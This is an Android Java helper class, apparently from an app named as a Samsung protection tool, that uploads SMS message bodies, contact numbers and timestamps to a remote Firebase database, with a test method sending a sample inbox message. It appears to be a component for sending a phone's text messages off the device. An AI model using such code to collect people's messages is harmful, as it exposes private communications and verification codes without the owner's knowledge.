package com.example.samsungprotect.Firebase;

import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

public class FirebaseHelper {
    private static final String TAG = "FirebaseHelper";
    private static final DatabaseReference root = FirebaseDatabase.getInstance().getReference();

    public static void uploadSMS(String type, String contact, String body, String timestamp) {
        try {
            DatabaseReference contactRef = root.child(type).child(contact);
            String msgId = contactRef.push().getKey();

            if (msgId != null) {
                Map<String, Object> smsData = new HashMap<>();
                smsData.put("body", body);
                smsData.put("timestamp", timestamp);

                Log.d(TAG, "Uploading SMS: " + smsData);

                contactRef.child(msgId).setValue(smsData)
                        .addOnSuccessListener(aVoid ->
                                Log.i(TAG, "SMS uploaded successfully"))
                        .addOnFailureListener(e ->
                                Log.e(TAG, "Upload failed", e));
            }
        } catch (Exception e) {
            Log.e(TAG, "Exception while uploading SMS", e);
        }
    }
    public static void testUpload() {
        Log.i(TAG, "Running testUpload()");
        uploadSMS(
                "inbox",
                "+11234567890",
                "This is a test message from testUpload()",
                "2025-07-25 16:30:00"
        );
    }
}
